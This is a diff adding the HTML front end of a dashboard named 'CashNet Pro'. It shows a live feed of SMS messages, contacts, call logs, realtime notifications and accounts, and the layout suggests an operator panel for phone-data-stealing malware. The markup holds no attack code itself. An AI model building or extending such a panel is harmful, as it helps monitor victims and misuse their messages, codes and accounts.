@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CashNet Pro</title>
+<link rel="stylesheet" href="/style.css">
+</head>
+<body>
+
+<!-- TOP BAR -->
+<header class="topbar">
+  <div class="brand">
+    <img src="/logo.png" alt="logo" class="brand-logo" onerror="this.style.display='none'">
+    <span>CashNet Pro</span>
+  </div>
+  <div class="status"><span class="dot"></span> LIVE</div>
+</header>
+
+<!-- MAIN LAYOUT -->
+<main class="layout">
+
+  <!-- SIDEBAR NAV -->
+  <nav class="sidebar">
+    <button class="nav-btn active" data-view="dashboard">
+      <span class="ico">▦</span> Dashboard
+    </button>
+    <button class="nav-btn" data-view="sms">
+      <span class="ico">✉</span> SMS
+    </button>
+    <button class="nav-btn" data-view="contacts">
+      <span class="ico">👤</span> Contacts
+    </button>
+    <button class="nav-btn" data-view="calls">
+      <span class="ico">📞</span> Calls
+    </button>
+    <button class="nav-btn" data-view="notifications">
+      <span class="ico">🔔</span> Notifications
+    </button>
+    <button class="nav-btn" data-view="accounts">
+      <span class="ico">🔑</span> Accounts
+    </button>
+  </nav>
+
+  <!-- CONTENT AREA -->
+  <section class="content">
+
+    <!-- DASHBOARD -->
+    <div class="view active" id="view-dashboard">
+      <h2>Dashboard</h2>
+      <div class="stats">
+        <div class="stat-card"><small>SMS</small><b id="cnt-sms">0</b></div>
+        <div class="stat-card"><small>Contacts</small><b id="cnt-contacts">0</b></div>
+        <div class="stat-card"><small>Calls</small><b id="cnt-calls">0</b></div>
+        <div class="stat-card"><small>Notifications</small><b id="cnt-notifs">0</b></div>
+        <div class="stat-card"><small>Accounts</small><b id="cnt-accounts">0</b></div>
+      </div>
+    </div>
+
+    <!-- SMS -->
+    <div class="view" id="view-sms">
+      <h2><span class="ico">✉</span> SMS</h2>
+      <input class="search" placeholder="Search message..." data-filter="sms">
+      <div class="list" id="list-sms"></div>
+    </div>
+
+    <!-- CONTACTS -->
+    <div class="view" id="view-contacts">
+      <h2><span class="ico">👤</span> Contacts</h2>
+      <input class="search" placeholder="Search name or number..." data-filter="contacts">
+      <div class="list" id="list-contacts"></div>
+    </div>
+
+    <!-- CALLS -->
+    <div class="view" id="view-calls">
+      <h2><span class="ico">📞</span> Call Logs</h2>
+      <input class="search" placeholder="Search number..." data-filter="calls">
+      <div class="list" id="list-calls"></div>
+    </div>
+
+    <!-- NOTIFICATIONS -->
+    <div class="view" id="view-notifications">
+      <h2><span class="ico">🔔</span> Notifications <small class="live-tag">realtime</small></h2>
+      <input class="search" placeholder="Search app or text..." data-filter="notifications">
+      <div class="list" id="list-notifications"></div>
+    </div>
+
+    <!-- ACCOUNTS -->
+    <div class="view" id="view-accounts">
+      <h2><span class="ico">🔑</span> Accounts</h2>
+      <input class="search" placeholder="Search account..." data-filter="accounts">
+      <div class="list" id="list-accounts"></div>
+    </div>
+
+  </section>
+</main>
+
+<script src="/app.js"></script>
+</body>
+</html>
